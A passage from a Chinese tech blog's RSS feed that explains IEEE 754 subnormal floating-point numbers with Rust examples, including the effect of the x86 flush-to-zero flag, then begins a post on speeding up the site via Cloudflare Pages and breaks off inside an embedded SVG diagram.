fill="transparent" d="M0 334h715v83H0z" class="stroke-B1" style="stroke-width:0"/></g><text x="357.5" y="386.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:30px">x = (-1) × 2^(-1022) × 3 × 2^(-52) = -3 × 2^(-1074)</text></g><g id="bin.'s = sign (1 bit)'" class="header"><g class="shape"><path fill="#fff0f5" d="M0 46h192v82H0z" class="stroke-B1" style="stroke-width:0"/></g><text x="96" y="92.5" class="text-bold text-underline fill-N1" style="text-anchor:middle;font-size:16px">s = sign (1 bit)</text></g><g id="bin.'e = exponent (11 bit)\n(e=0)'" class="header"><g class="shape"><path fill="#e6e6fa" d="M192 46h229v82H192z" class="stroke-B1" style="stroke-width:0"/></g><text x="306.5" y="84.5" class="text-bold text-underline fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="306.5" dy="0">e = exponent (11 bit)</tspan><tspan x="306.5" dy="18.5">(e=0)</tspan></text></g><g id="bin.'m = fraction (52 bit)'" class="header"><g class="shape"><path fill="#f0f8ff" d="M421 46h294v82H421z" class="stroke-B1" style="stroke-width:0"/></g><text x="568" y="92.5" class="text-bold text-underline fill-N1" style="text-anchor:middle;font-size:16px">m = fraction (52 bit)</text></g><g id="bin.1"><g class="shape"><path fill="pink" d="M0 128h192v82H0z" class="stroke-B1" style="stroke-width:0"/></g><text x="96" y="174.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">1</text></g><g id="bin.01111111110"><g class="shape"><path fill="#d8bfd8" d="M192 128h229v82H192z" class="stroke-B1" style="stroke-width:0"/></g><text x="306.5" y="174.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">01111111110</text></g><g id="bin.'00000000000000000000000000\n00000000000000000000000011'"><g class="shape"><path fill="#add8e6" d="M421 128h294v82H421z" class="stroke-B1" style="stroke-width:0"/></g><text x="568" y="166.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="568" dy="0">00000000000000000000000000</tspan><tspan x="568" dy="18.5">00000000000000000000000011</tspan></text></g><g id="bin.xx1" class="shape"><path fill="transparent" d="M0 210h192v124H0z" class="stroke-B1" style="stroke-width:0"/></g><g id="bin.xx2" class="shape"><path fill="transparent" d="M192 210h229v124H192z" class="stroke-B1" style="stroke-width:0"/></g><g id="bin.'M=(0.m₅₁m₅₀...m₀)₂\n=(0.000000000...11)₂\n=3×2^(-52)'"><g class="shape"><path fill="transparent" d="M421 210h294v124H421z" class="stroke-B1" style="stroke-width:0"/></g><text x="568" y="256.5" fill="#00008b" class="text-bold" style="text-anchor:middle;font-size:24px"><tspan x="568" dy="0">M=(0.m₅₁m₅₀...m₀)₂</tspan><tspan x="568" dy="26.333">=(0.000000000...11)₂</tspan><tspan x="568" dy="26.333">=3×2^(-52)</tspan></text></g><g id="bin.xx1.'S=(-1)^1'"><g class="shape"><path fill="transparent" d="M0 210h133v76H0z" class="stroke-B1" style="stroke-width:0"/></g><text x="66.5" y="256.5" fill="#cd5c5c" class="text-bold" style="text-anchor:middle;font-size:24px">S=(-1)^1</text></g><g id="bin.xx1.×"><g class="shape"><path fill="transparent" d="M133 210h59v76h-59z" class="stroke-B1" style="stroke-width:0"/></g><text x="162.5" y="256.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:24px">×</text></g><g id="bin.xx2.'E=2^(-1022)'"><g class="shape"><path fill="transparent" d="M192 210h170v76H192z" class="stroke-B1" style="stroke-width:0"/></g><text x="277" y="256.5" fill="#9400d3" class="text-bold" style="text-anchor:middle;font-size:24px">E=2^(-1022)</text></g><g id="bin.xx2.×"><g class="shape"><path fill="transparent" d="M362 210h59v76h-59z" class="stroke-B1" style="stroke-width:0"/></g><text x="391.5" y="256.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:24px">×</text></g><mask id="d2-2895707930" width="715" height="417" x="0" y="0" maskUnits="userSpaceOnUse"><path fill="#fff" d="M0 0h715v417H0z"/><path fill="rgba(0,0,0,0.75)" d="M261 5h193v36H261zM40.5 356.5h634v38h-634zM47.5 76.5h97v21h-97zM234.5 68.5h144v37h-144zM499 76.5h138v21H499zM92.5 158.5h7v21h-7zM260 158.5h93v21h-93zM458 150.5h220v37H458zM443.5 232.5h249v79h-249zM22.5 232.5h88v31h-88zM155.5 232.5h14v31h-14zM214.5 232.5h125v31h-125zM384.5 232.5h14v31h-14z"/></mask></svg></svg></figure><p >Subnormal FP 与 Normal FP 的区别主要体现在以下几点：</p><ul><li>由于 $\text{fp}_e(x)$ 固定为了 $0$，表达式 $\eqref{eq:subnormal}$ 中不再出现字母 $e$，而是直接用 $2^{-1022}$；</li><li>底数的范围不再是 $[1,2)$，而是 $[0,1)$，因此表达式中 $\eqref{eq:subnormal}$ 的 $1+m/2^{52}$ 变成了 $m/2^{52}$。</li></ul><p >容易看出，由于 $2^{-1022}$ 这一项的存在，Subnormal FP 所表示的数绝对值都很小。这实际上弥补了 Normal FP 和 0 之间的空隙，使得 FP64 能够表示更多的数。我们还能看到，这种设计是融洽且符合直觉的：</p><ul><li>Normal FP 的最小值与 Subnormal FP 的最大值紧密相连，分别是 $2^{-1022}$ 和 $2^{-1022} \times (1 - 2^{-52})$；</li><li>零可以看作是 Subnormal FP 的特例。事实上，把 $s = m = 0$ 带入 $\eqref{eq:subnormal}$，正好可以得到 $0$。</li></ul><p >尽管都能表示实数，但由于 Normal FP 和 Subnormal FP 的计算方式不同，IEEE 754 还是正式地将它们区分开来，并置于两个独立的类别中。</p><h2 id="解密-1075">解密 1075</h2><p >有了 Normal FP 和 Subnormal FP 的前置知识，我们终于可以解释为什么开头的代码会恰好在 1075 次后结束。本节先尝试用一个思想实验解释这一现象，然后用 Rust 代码验证这一点。</p><p >在思想实验前，我们先给出一条显而易见的规则：如果 $x$ 和 $x/2$ 都是 Normal FP，则除法发生前后，s 和 m 都不变，只有 e 减一，即 $\text{fp}_e(x/2)=\text{fp}_e(x)-1$。读者可以结合 Normal FP 的定义 $\eqref{eq:normal}$ 自行验证这一点。</p><p >现在考察程序的起点，也就是 $x_0 = 1$ 的二进制表示：</p><p >$$\text{fp}_s(x_0) = 0, \text{fp}_e(x_0) = 1023, \text{fp}_m(x_0) = 0$$</p><p >根据前述规则，当 x 还在 Normal FP 的表示范围内时，每次除以二相当于将指数减一，直至指数达到 0。此过程可持续 1022 次：</p><p >$$\begin{aligned}  x_1 &amp;= 2^{-1} &amp;\leadsto &amp;\quad \text{fp}_s(x_1) = 0, \text{fp}_e(x_1) = 1022, \text{fp}_m(x_1) = 0 \\  x_2 &amp;= 2^{-2} &amp;\leadsto &amp;\quad \text{fp}_s(x_2) = 0, \text{fp}_e(x_2) = 1021, \text{fp}_m(x_2) = 0 \\  &amp;&amp;\ldots &amp;\\  x_{1022} &amp;= 2^{-1022} &amp;\leadsto &amp;\quad \text{fp}_s(x_{1022}) = 0, \text{fp}_e(x_{1022}) = 1, \text{fp}_m(x_{1022}) = 0 \\\end{aligned}$$</p><p >此时若再进一步，我们将得到 $x_{1023} = 2^{-1023}$，但这个数已经离开了 Normal FP 的范围，进入到 Subnormal FP 的领域。</p><p >现在我们需要另一条规则：如果 $x$ 和 $x/2$ 都是 Subnormal FP，则做除法相当于将 m 右移 1 位，即 $\text{fp}_m(x/2)=\text{fp}_m(x)\ shr\ 1$。这一规则同样可以从 Subnormal FP 的定义 $\eqref{eq:subnormal}$ 中直接得到。运用这条规则，我们有：</p><p >$$\begin{aligned}  x_{1023} &amp;= 2^{-1023} &amp;\leadsto &amp;\quad \text{fp}_s(x_{1023}) = 0, \text{fp}_e(x_{1023}) = 0, \text{fp}_m(x_{1023}) = 2^{51} \\  x_{1024} &amp;= 2^{-1024} &amp;\leadsto &amp;\quad \text{fp}_s(x_{1024}) = 0, \text{fp}_e(x_{1024}) = 0, \text{fp}_m(x_{1024}) = 2^{50} \\  &amp;&amp;\ldots &amp;\\  x_{1074} &amp;= 2^{-1074} &amp;\leadsto &amp;\quad \text{fp}_s(x_{1074}) = 0, \text{fp}_e(x_{1074}) = 0, \text{fp}_m(x_{1074}) = 2^0 \\\end{aligned}$$</p><p >再往后，即使是 Subnormal FP 也无法表示如此小的数，于是 $x_{1075}$ 终于归零。在此期间，我们经历了 1022 个 Normal FP，52 个 Subnormal FP，以及最后 1 个 0，共 1075 个值。我们可以用如下 Rust 代码验证这一点：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">counter</span> = std::collections::HashMap::<span class="hljs-title function_ invoke__">new</span>();</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">x</span> = <span class="hljs-number">1f64</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> x != <span class="hljs-number">0</span>. {</span><br><span class="line">        x /= <span class="hljs-number">2.0f64</span>;</span><br><span class="line">        *counter.<span class="hljs-title function_ invoke__">entry</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;{:?}&quot;</span>, x.<span class="hljs-title function_ invoke__">classify</span>())).<span class="hljs-title function_ invoke__">or_insert</span>(<span class="hljs-number">0</span>) += <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    dbg!(counter);</span><br><span class="line">}</span><br><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK4.SEC1" data-gk-type="zip"><span class="line"><span class="hljs-comment">// Output:</span></span><br><span class="line"><span class="hljs-comment">// [src/main.rs:8:5] counter = {</span></span><br><span class="line"><span class="hljs-comment">//     &quot;Zero&quot;: 1,</span></span><br><span class="line"><span class="hljs-comment">//     &quot;Normal&quot;: 1022,</span></span><br><span class="line"><span class="hljs-comment">//     &quot;Subnormal&quot;: 52,</span></span><br><span class="line"><span class="hljs-comment">// }</span></span><br></span></pre></div></div><h2 id="subnormal-fp-的支持性问题">Subnormal FP 的支持性问题</h2><p >最后，本文就 Subnormal FP 再作进一步讨论。</p><p >尽管 IEEE 754 定义了 Subnormal FP，这并不意味着它在所有场景下都被支持。在实际中，Subnormal FP 的支持可能面临如下限制：</p><ul><li>硬件本身不支持。这可能为了简化硬件设计，或者为了提高性能而舍弃了 Subnormal FP 的支持；</li><li>该功能被编程性地关闭了。某些硬件即便支持 Subnormal FP，其运算性能可能远不如 Normal FP。因此在一些场景下，为了提高浮点运算性能，程序会选择关闭 Subnormal FP 特性。</li></ul><p >例如，在 x86 架构中，可通过设置 CSR 寄存器的 <code>FTZ</code> 标志位来控制 Subnormal FP 的支持。</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {</span><br><span class="line">    <span class="hljs-keyword">unsafe</span> {</span><br><span class="line">        <span class="hljs-keyword">use</span> core::arch::x86_64::{_mm_getcsr, _mm_setcsr, _MM_FLUSH_ZERO_ON};</span><br><span class="line">        _mm_setcsr(_mm_getcsr() | _MM_FLUSH_ZERO_ON);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">x</span> = <span class="hljs-number">1.0f64</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> x != <span class="hljs-number">0</span>. {</span><br><span class="line">        x /= <span class="hljs-number">2.0</span>;</span><br><span class="line">        i += <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;{}&quot;</span>, i); <span class="hljs-comment">// 1023</span></span><br><span class="line">}</span><br></pre></div></div><p >在上面的代码中，我们通过 <code>_mm_setcsr</code> 函数设置了 <code>FTZ</code> 标志位。该标志位的出现指示 CPU：当运算结果得到 Subnormal FP 时，直接将其截断为 0。因此，上述代码会在 1023 次后结束，而不是 1075 次。</p><p >以上的例子表明，Subnormal FP 不是一个可靠的特性。在实际应用中，可能因为硬件的限制或是某些库的设置，浮点运算无法得到 Subnormal FP 值。通常来说，我们不提倡依赖 Subnormal FP 进行计算以获得更高的精度。如果确实需要 Subnormal FP，我们应当在程序中显式地开启或检查这一特性，以确保计算的正确性。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Rust/">Rust</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Floating-Point/">Floating-Point</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Subnormal-FP/">Subnormal FP</category>
      
      <category domain="https://i.hsfzxjy.site/tags/IEEE-754/">IEEE 754</category>
      
      
      <comments>https://i.hsfzxjy.site/repeatly-divide-one-until-zero/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>老生常谈：使用 Cloudflare 自选 IP 加速站点访问</title>
      <link>https://i.hsfzxjy.site/cloudflare-blog-acceleration/</link>
      <guid>https://i.hsfzxjy.site/cloudflare-blog-acceleration/</guid>
      <pubDate>Sun, 15 Sep 2024 06:53:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;本站此前是依托 Github Pages 搭建的，即静态文件托管于 Github 上，再将自定义域名 i.hsfzxjy.site CNAME 到 hsfzxjy.github.io。这种方案免费是免费，但国内的访问速度不甚良好，有几个省甚至出现了超时的现象&lt;sup id</description>
        
      
      
      
      <content:encoded><![CDATA[<p >本站此前是依托 Github Pages 搭建的，即静态文件托管于 Github 上，再将自定义域名 i.hsfzxjy.site CNAME 到 hsfzxjy.github.io。这种方案免费是免费，但国内的访问速度不甚良好，有几个省甚至出现了超时的现象<sup id="fnref:1"><a href="#fn:1">1</a></sup>。为了优化访问，本站现将静态文件迁移至 Cloudflare Pages 上，并使用 Cloudflare 的自选 IP 加速访问。</p><figure>    <div style="display: flex; flex-wrap: wrap;" class="image-col-2">        <img loading="lazy" src="../assets/2024-09-14-cloudflare-blog-acceleration/image.png">        <img loading="lazy" src="../assets/2024-09-14-cloudflare-blog-acceleration/image-1.png">    </div>    <figcaption class="font__ui" style="text-align: center">[图1] 优化前的效果；[图2] 优化后的效果。</figcaption></figure><h1 id="github-pages-为什么慢？">Github Pages 为什么慢？</h1><p >Github 没有对国内访问作网络优化，因此从国内出发的所有请求，无论使用 Pages 域名或是自定义域名，都会经由较差的线路到达境外的 Github 服务器。以下是网络拓扑的示意图。</p><figure class="d2"><svg xmlns="http://www.w3.org/2000/svg" width="444" height="128" preserveAspectRatio="xMinYMin meet" viewBox="0 0 633 182"><svg id="d2-svg" width="633" height="182" class="d2-1451215561" viewBox="11 11 633 182"><rect width="633" height="182" x="11" y="11" stroke-width="0" rx="0" style="fill:#fff"/><style>@font-face{font-family:d2-1451215561-font-regular;src:url(data:application/font-woff;base64,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)}.d2-1451215561 .text-bold{font-family:'d2-1451215561-font-bold'}@font-face{font-family:d2-1451215561-font-bold;src:url(data:application/font-woff;base64,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)}.d2-1451215561 